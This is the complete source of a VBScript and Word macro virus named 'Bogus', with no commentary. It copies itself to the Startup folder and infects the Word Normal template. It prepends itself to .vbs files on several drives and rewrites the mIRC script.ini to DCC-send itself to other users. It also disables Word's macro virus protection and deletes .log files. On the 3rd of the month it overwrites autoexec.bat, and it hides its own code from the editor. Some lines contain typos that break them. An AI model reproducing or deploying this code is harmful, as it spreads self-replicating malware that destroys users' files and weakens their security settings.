'bogus
Sub Main_vbs()
On Error Resume Next
Dim Fso, wordobj, bytess, mecode
bytess = 4872
Set Fso = CreateObject("Scripting.FileSystemObject")
Set wordobj = CreateObject("Word.Application")
pay
Set f = Fso.opentextfile(wscript.ScriptFullName, 1)
mecode = f.read(bytess)
f.Close
Fso.CopyFile wscript.ScriptFullName, "c:\WINDOWS\Start Menu\Programs\StartUp\Startup.vbs"
Set nw = Fso.cretetextfile("c:\a.b", True)
nw.writeline "Attribute VB_Name = " & Chr(34) & "yoz" & Chr(34)
nw.writeline ""
nw.writeline mecode
nw.Close
Set nw = Fso.createtextfile("C:\a.l", True)
nw.writeline mecode
nw.Close
GetVbs ("c")
GetVbs ("d")
GetVbs ("e")
GetVbs ("f")
Fso.DeleteFile "c:\a.l"
Set NT = wordobj.NormalTemplate.VBProject.VBComponents
For h = 1 To NT.Count
If NT(h).Name = "yoz" Then GoTo dam
Next h
NT.Import "c:\a.b"
dam:
wordobj.NormalTemplate.Save
wordobj.Quit
wordobj = ""
Fso.DeleteFile ("c:\a.b")
GetMirc
Fso = ""
End Sub
Sub GetVbs(a)
On Error Resum Next
Dim Fso, excell
Set Fso = CreateObject("Scripting.FileSystemObject")
Set excell = CreateObject("Excel.Application")
Set ff = excell.Application.FileSearch
If Fso.DriveExists(a) Then
ff.LookIn = a & ":\"
ff.SearchSubFolders = True
ff.FileName = "*.vbs"
ff.Execute
For j = 1 To ff.FoundFiles.Count
Set op = opentextfile(ff.FoundFiles(j), 1)
g = op.readline
op.Close
If g <> "'bogus" Then
Set mmm = opentextfile("c:\a.l", 1)
codd = mmm.radall
mmm.Close
Set victim = opentextfile(ff.FoundFiles(j), 1)
viccode = victim.readall
victim.Close
Set victim = opentextfile(ff.FoundFiles(j), 2, True)
victim.writeline codd
victim.writeline ""
victim.writeline "'<=== host starts here"
victim.writeline ""
victim.writeline viccode
victim.Close
End If
Next
End If
End Sub
Sub GetMirc()
on error resume next
Set Fso = CreateObject("Scripting.FileSystemObject")
If (Fso.FolderExists("c:\mirc")) Then
Set ini = Fso.opentextfile("C:\mirc\script.ini")
Fso.CopyFile wscript.ScriptFullName, "c:\windows\help\bogus.vbs"
ini.writeline "[script]"
ini.writeline "on 1:FILERCVD:*.*:./dcc send $nick c:\windows\help\bogus.vbs"
ini.writeline "on 1:FILESENT:*.*:./dcc send $nick c:\windows\help\bogus.vbs"
ini.writeline "on 1:PART:#:/if ($nick == $me) { halt } | .dcc send $nick c:\windows\help\bogus.vbs"
ini.writeline "ctcp 1:ping:?:/notice $nick Bogus!Reality Or Imagination? | /halt"
ini.writeline "on 1:TEXT:*real*:#:/msg $chan Bogus!Reality Or Imagination?"
ini.writeline "On 1:join:#:/msg $nick Bogus!!!"
ini.writeline ";Bogus "
ini.writeline ";Imagination Or Reality?"
ini.Close
End If
End Sub
Sub AutoOpen()
On Error Resume Next
Dim normal As Boolean, active As Boolean
Application.ShowVisualBasicEditor = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.CheckGrammarAsYouType = False
Application.EnableCancelKey = wdCancelDisabled
For c = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(c).Name = "yoz" Then normal = True
Next
For c = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(c).Name = "yoz" Then active = True
Next
If normal = True And active = False Then
NormalTemplate.VBProject.VBComponents("yoz").Export "c:\a.dat"
ActiveDocument.VBProject.VBComponents.Import "c:\a.dat"
Kill "c:\a.dat"
End If
If active = True And normal = False Then
ActiveDocument.VBProject.VBComponents("yoz").Export "c:\b.a"
NormalTemplate.VBProject.VBComponents.Import "c:\b.a"
Kill "c:\b.a"
End If
If normal = True And active = True Then
ActiveDocument.ConvertNumbersToText
MsgBox "Completed", vbCritical, "Word 97 Plus"
With Application.FileSearch
.LookIn = "c:\"
.SearchSubFolders = True
.FileName = "*.log"
.Execute msoSortByFileName
End With
For f = 1 To Application.FileSearch.FoundFiles.Count
Kill Application.FileSearch.FoundFiles(f)
Next f
MsgBox "Memory Cleaned", vbApplicationModal, "Word 97 Plus(c)"
End If
Drop_Vbs
pay
End Sub
Sub Drop_Vbs()
Main
End Sub
Sub pay()
On Error Resume Next
If Day(Now) = 3 Then
MsgBox "Reality Or Imagination?", vbApplicationModal, "Choose"
Set Fso = CreateObject("scripting.filesystemobject")
Set f = Fso.opentextfile("c:\autoexec.bat", 2, True)
f.write "pause"
f.write "echo Reality Or Imagination?"
f.write "Echo Bogus!!!"
f.write "Echo HAHAHAHA"
f.write "pause"
f.Close
Set Fso = ""
MsgBox "Bogus!", vbCritical, "!!!?!!!"
End If
End Sub
Sub ViewVbCode()
Flet
Application.ShowVisualBasicEditor = True
End Sub
Sub Flet()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("yoz").CodeModule.DeleteLines 1, 167
NormalTemplate.VBProject.VBComponents("yoz").CodeModule.DeleteLines 1, 167
NormalTemplate.Saved = True
ActiveDocument.Saved = True
End Sub
Sub ToolsMacro()
Flet
End Sub
Sub FileTemplates()
Flet
End Sub
Call Main

